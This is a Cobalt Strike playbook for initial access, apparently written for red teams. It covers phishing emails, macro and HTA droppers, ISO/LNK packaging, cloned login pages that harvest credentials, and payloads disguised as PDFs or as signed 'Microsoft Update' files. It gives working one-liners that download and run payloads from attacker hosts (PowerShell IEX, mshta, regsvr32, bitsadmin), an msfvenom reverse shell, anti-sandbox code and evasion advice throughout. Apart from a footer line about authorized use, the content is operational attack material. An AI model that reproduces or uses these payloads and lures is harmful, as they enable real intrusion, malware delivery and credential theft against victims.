# Cobalt Strike — Initial Access & Phishing (English)

> Techniques for gaining initial access to target environments using Cobalt Strike. Covers spear phishing, payload delivery, web drive-by, and USB-based access.

---

## Table of Contents

1. [Initial Access Strategy](#1-initial-access-strategy)
2. [Spear Phishing with CS](#2-spear-phishing-with-cs)
3. [Office Macro Payloads](#3-office-macro-payloads)
4. [HTML Application (HTA) Delivery](#4-html-application-hta-delivery)
5. [ISO / LNK Delivery (Modern Phishing)](#5-iso--lnk-delivery-modern-phishing)
6. [Scripted Web Delivery](#6-scripted-web-delivery)
7. [Web Drive-By Attacks](#7-web-drive-by-attacks)
8. [Weaponized Attachments](#8-weaponized-attachments)
9. [HTTPS Payload Hosting](#9-https-payload-hosting)
10. [User Simulation & Sandbox Evasion](#10-user-simulation--sandbox-evasion)
11. [Physical Access (USB/Rubber Ducky)](#11-physical-access-usbrubber-ducky)
12. [Initial Access OPSEC](#12-initial-access-opsec)

---

## 1. Initial Access Strategy

### Attack Vector Decision Tree

```
Target assessment
    │
    ├─ Is web app exposed?
    │   → Exploit web vuln → webshell → upload payload → execute
    │
    ├─ VPN/Citrix/OWA/VDI with weak creds?
    │   → Password spray → harvest valid creds → login → execute payload
    │
    ├─ External-facing RDP?
    │   → Brute-force or leaked creds → RDP in → execute
    │
    └─ No obvious external exposure?
        → Spear phishing is the primary path
            ├─ Email with attachment (macro, ISO, LNK)
            ├─ Email with link (drive-by, scripted delivery)
            └─ Smishing/vishing (social engineering for cred harvest)
```

### CS Team Server Readiness for Phishing

Before sending phishing:
```
1. Malleable C2 profile loaded and tested
2. HTTPS listener with valid TLS cert created
3. Redirector configured (victim should NOT see team server IP)
4. Staged or stageless payload generated and tested
5. Payload hosting confirmed (web server, Scripted Web Delivery)
6. Payload passes AV scan (or is obfuscated to bypass)
```

---

## 2. Spear Phishing with CS

### Cobalt Strike Spear Phishing Module

```
Attacks → Spear Phish
  Targets:        targets.txt (list of email addresses)
  Template:       phishing_template.html
  Attachment:     (leave blank for link-only, or specify generated payload)
  Mail Server:    smtp.sendgrid.net:587
  Bounce Address: noreply@yourdomain.com
  From Name:      IT Security Team
```

### Target File Format (targets.txt)

```
First Last <target@corp.com>
John Smith <jsmith@corp.com>
Jane Doe <jdoe@corp.com>
```

### Email Template Creation

```html
<!-- phishing_template.html -->
<!DOCTYPE html>
<html>
<body>
<p>Dear %TARGET_FIRST%,</p>
<p>Please review the attached security update document and follow the instructions.</p>
<p>This is required by <b>%DATE%</b>.</p>
<p>If you have questions, contact IT Security.</p>
<p>Best regards,<br>IT Security Team</p>
</body>
</html>
```

CS template variables:
```
%TARGET_FIRST%    — recipient's first name
%TARGET_LAST%     — recipient's last name
%TARGET_EMAIL%    — recipient's email
%FROM%            — sender's name/email
%DATE%            — current date
```

### Tracking Phishing Opens

CS tracks link clicks and attachment opens automatically in the Spear Phish Campaign log:
```
View → Spear Phish → (select campaign) → logs
```

---

## 3. Office Macro Payloads

### Generating a Macro Payload

```
Attacks → Packages → MS Office Macro
  Listener: lab-https
```

This generates a VBA macro to paste into an Office document.

### Macro Content (Reference)

The generated macro typically:
1. Decodes a base64-encoded PowerShell one-liner from string constants
2. Runs it via `Shell` or `CreateObject("WScript.Shell").Run`

```vba
' Example minimal macro structure
Private Sub Auto_Open()
    Dim payload As String
    payload = "<base64_encoded_PS_command>"
    
    Dim decoded As String
    decoded = DecodeBase64(payload)
    
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run "powershell.exe -nop -w hidden -enc " & decoded, 0, False
End Sub
```

### Document Preparation

1. Generate macro in CS
2. Open Word/Excel
3. Developer → Visual Basic → paste macro into ThisDocument / ThisWorkbook
4. Save as `.doc` / `.xls` (old format — macros not blocked by default in older Office versions)
5. Or save as `.xlsm` / `.docm` (macro-enabled)

### Social Engineering the Enable Macros Dialog

Documents must display a prompt convincing users to enable macros. Common lures:

```
"This document is protected. To view the contents, click Enable Content."
"This document was created in an older version of Office. Enable macros to view correctly."
"Security scan complete — click Enable Content to unlock the document."
```

Include a blurred/blocked fake content preview as background to create urgency.

### OPSEC Note on Macros

Microsoft now blocks macros in documents downloaded from the internet (Mark of the Web — MOTW) by default in Office 365. Deliver via:
- Internal SharePoint/email (trusted zone — MOTW often not applied)
- ISO file (isolates MOTW from inner files)
- Password-protected archive (password prevents AV scanning, MOTW stripped on extraction in some versions)

---

## 4. HTML Application (HTA) Delivery

### Generate HTA Payload

```
Attacks → Web Drive-by → HTML Application
  Listener: lab-https
  Type:     Powershell  (or VBA)
  URI:      /update
```

CS hosts the HTA at `http://teamserver/update.hta`. Send link to victim:
```
"Please install the required software update: http://redirector/update.hta"
```

When the victim clicks and opens the `.hta` file, `mshta.exe` executes the embedded payload.

### HTA Content (Reference)

```html
<html>
<head>
<script language="VBScript">
Function RunPayload()
    Dim wsh
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run "powershell.exe -nop -w hidden -enc <base64>", 0
    window.close()
End Function
RunPayload
</script>
</head>
<body>
<p>Loading...</p>
</body>
</html>
```

### OPSEC Note on HTA

Windows SmartScreen flags `.hta` files downloaded from the internet. Better delivery paths:
- As email attachment (bypasses SmartScreen for some mail clients)
- Hosted on internal trusted site
- Via social engineering to download and run

---

## 5. ISO / LNK Delivery (Modern Phishing)

ISO files bypass MOTW on older Windows versions. Files inside an ISO do not inherit the zone identifier.

### Workflow

```
1. Create payload (stageless EXE or DLL sideload)
2. Create LNK shortcut pointing to the payload
3. Package EXE + LNK into ISO file
4. Send ISO as email attachment or link

Victim flow:
  Double-click ISO → Windows mounts as drive letter
  Victim sees only LNK (EXE is hidden)
  Double-click LNK → runs payload → Beacon
```

### Creating LNK File

```powershell
# On operator Linux box:
# Use lnk-create tool or PowerShell

$wsh = New-Object -ComObject WScript.Shell
$lnk = $wsh.CreateShortcut("$env:TEMP\Invoice.lnk")
$lnk.TargetPath   = "C:\Windows\System32\cmd.exe"
$lnk.Arguments    = "/c C:\Windows\System32\mshta.exe http://203.0.113.10/payload.hta"
$lnk.WorkingDirectory = "C:\Windows\System32"
$lnk.IconLocation = "%SystemRoot%\system32\shell32.dll,70"   # Word icon
$lnk.WindowStyle  = 7   # minimized
$lnk.Save()
```

Or use `lnkup` / `lnk-create`:
```bash
# lnkup (Python):
python3 lnkup.py --host 203.0.113.10 --type duckytail --output Invoice.lnk
```

### Creating ISO File

```bash
# Linux:
mkdir iso_content
cp Invoice.lnk iso_content/
cp beacon.exe iso_content/.beacon.exe    # hidden with . prefix
mkisofs -o invoice.iso iso_content/

# Or use xorriso:
xorriso -as mkisofs -o invoice.iso iso_content/
```

### Advanced: DLL Sideloading in ISO

Place a legitimate signed EXE + malicious DLL in the ISO:

```
invoice.iso
├── View_Invoice.exe    (legitimate signed EXE that loads sideloaded DLL)
├── version.dll         (malicious — shadows system version.dll)
└── (hidden: beacon.shellcode or beacon.dll)
```

---

## 6. Scripted Web Delivery

### Setup in CS

```
Attacks → Web Drive-by → Scripted Web Delivery
  URI:      /update
  Listener: lab-https
  Type:     PowerShell
  Host:     redirector or TS IP
```

CS displays the generated one-liner:
```powershell
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('https://redirector.com/update'))"
```

### Delivery Methods for the One-Liner

```
# Via RCE in web application:
curl "https://target/vuln?cmd=powershell%20-nop%20-w%20hidden%20..."

# Via Citrix/VDI desktop:
# Paste one-liner in Run dialog (Win+R) or browser address bar

# Via existing shell access:
cmd.exe> powershell -nop -w hidden -c "IEX((new-object net.webclient).downloadstring('...'))"

# Via malicious document macro:
wsh.Run "powershell.exe -nop -w hidden -c """ & one_liner & """", 0
```

### Other Delivery Types

```
Type: PowerShell (64-bit)
  → Uses powershell.exe

Type: regsvr32
  → regsvr32.exe /s /n /u /i:https://redirector.com/update.sct scrobj.dll

Type: bitsadmin
  → bitsadmin /transfer myJob /download /priority HIGH https://redirector.com/update.exe C:\Temp\update.exe & start C:\Temp\update.exe

Type: mshta
  → mshta.exe https://redirector.com/update.hta
```

---

## 7. Web Drive-By Attacks

### Cloning a Target Website

```
Attacks → Web Drive-by → Clone Site
  Clone URL:  https://corp-intranet.corp.com/login
  Local URI:  /portal
```

CS clones the site and hosts it at `/portal`. When victim enters credentials, CS captures them.

### Credential Harvesting

CS logs captured credentials to:
```
View → Web Log
```

### Java Signed Applet (Legacy — Pre-JRE 8)

```
Attacks → Web Drive-by → Java Signed Applet
```

This is largely obsolete — JRE 8+ requires explicit trust for all Java applets.

### Browser Exploit Payloads

For client-side exploits (require known browser vulnerabilities — highly targeted):
```
Attacks → Web Drive-by → Browser Exploitation Framework (BeEF) Integration
```

---

## 8. Weaponized Attachments

### PDF with Embedded Payload

Use a malicious PDF that exploits a PDF reader vulnerability or executes JavaScript:

```
# msfvenom PDF generator (reference — detect by most AV):
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=203.0.113.10 LPORT=443 -f pdf > invoice.pdf
```

Better: use a legitimate PDF with social engineering (clicking a link inside launches mshta/PowerShell).

### CHM (Compiled HTML Help) File

CHM files can execute JavaScript when opened:

```
# Create malicious CHM:
# 1. Create an HTML file with JavaScript to execute payload
# 2. Compile to CHM using hhc.exe (Windows HTML Help Compiler)

# HTML content:
<html>
<body>
<object id="x" classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">
<param name="Command" value="ShortCut">
<param name="Item1" value=",cmd.exe,/c powershell.exe -nop -w hidden -enc <base64>">
</object>
<script>x.Click();</script>
</body>
</html>
```

---

## 9. HTTPS Payload Hosting

### CS Built-In Web Server

CS can host payloads directly:
```
Attacks → Web Drive-by → Host File
  File:    /opt/payloads/beacon-stageless.exe
  URI:     /update.exe
  Host:    203.0.113.10:443
```

Victim downloads:
```
beacon-stageless.exe can be delivered via:
- Email attachment
- Direct link in phishing email
- Download triggered by scripted delivery
```

### Apache Hosting with Mime Masquerading

```bash
# Host EXE as PDF for download bypass:
cp beacon.exe /var/www/html/invoice.pdf
echo 'Header set Content-Type "application/pdf"' >> /var/www/html/.htaccess

# When victim downloads "invoice.pdf", it's actually the EXE
# Browser may warn on execution but not block download
```

### Signed EXE to Reduce AV Detection

Signing the payload with a code signing certificate increases trust:
```
# Using osslsigncode (Linux):
osslsigncode sign -certs cert.pem -key key.pem \
    -n "Microsoft Update" -i "https://microsoft.com" \
    -in beacon.exe -out beacon_signed.exe
```

---

## 10. User Simulation & Sandbox Evasion

### Anti-Sandbox Checks

Add checks to payload stager to refuse execution in sandboxes:

```c
// Check 1: User interaction required (sandbox often auto-clicks)
if (GetSystemMetrics(SM_CXSCREEN) < 800) exit(0);  // too small = VM

// Check 2: Runtime duration check
DWORD t1 = GetTickCount();
Sleep(10000);
DWORD t2 = GetTickCount();
if ((t2 - t1) < 9000) exit(0);  // time accelerated = sandbox

// Check 3: Domain join check (corp targets are usually domain-joined)
LPWSTR buf = NULL;
NetGetJoinInformation(NULL, &buf, &type);
if (type != NetSetupDomainName) exit(0);  // not domain joined = sandbox/lab

// Check 4: Process count (sandboxes often have few processes)
// Count processes via CreateToolhelp32Snapshot — exit if < 20
```

### CS Malleable Profile — Sandbox Evasion via Sleep

```
stage { set sleep_mask "true"; }
```

The sleep mask XOR-encrypts Beacon while sleeping, preventing static memory scans during the sandbox analysis window.

---

## 11. Physical Access (USB/Rubber Ducky)

### USB Rubber Ducky / Bash Bunny Payload

The Bash Bunny/Rubber Ducky types keystrokes automatically:

```
# Rubber Ducky script (DuckyScript):
DELAY 1000
GUI r
DELAY 500
STRING powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('https://redirector.com/payload'))"
ENTER
```

### USB Autorun (Windows 7 / Older)

```
# autorun.inf (USB root)
[autorun]
open=payload.exe
action=Install Security Update
label=Security Update
icon=payload.exe,0
```

> Modern Windows 10/11 blocks autorun for non-optical drives.

### LNK File on USB

Place an LNK shortcut in the USB root. Victim navigates to USB → double-clicks LNK:
```
shortcut points to: C:\Windows\System32\mshta.exe http://redirector.com/payload.hta
```

---

## 12. Initial Access OPSEC

### Sending Phishing Safely

- **Use SMTP relay services** (SendGrid, Amazon SES, MailGun) for deliverability — not your team server
- **Sender domain:** register a lookalike domain (`corp-helpdesk.com` instead of `corp.com`)
- **DKIM/SPF/DMARC:** configure all three on your sending domain to pass spam filters
- **Timing:** send during business hours (9–11 AM or 2–4 PM on Tuesday/Wednesday — highest open rates)
- **Target:** limit initial wave to 5–10 recipients to test spam filter pass-through

### Payload Delivery OPSEC

- **Test payload against Windows Defender at minimum** before sending
- **Payload should not contact C2 immediately** — add a short delay or sandbox check first
- **Use redirectors** between payload and team server
- **One-time-use download links** — after first download, serve 404 to prevent repeated scanning

### C2 Domain Categories

```
# Check domain categorization before use:
# - Umbrella: https://investigate.umbrella.com/
# - BlueCoat: https://sitereview.bluecoat.com/
# - Fortiguard: https://www.fortiguard.com/webfilter

# Best categories for phishing domains:
"Business and Economy", "Technology", "Information Technology"
# Avoid: "Newly Registered Domains", "Uncategorized"
```

---

*Last updated: 2026-06-09 | Reference for authorized red team use only.*
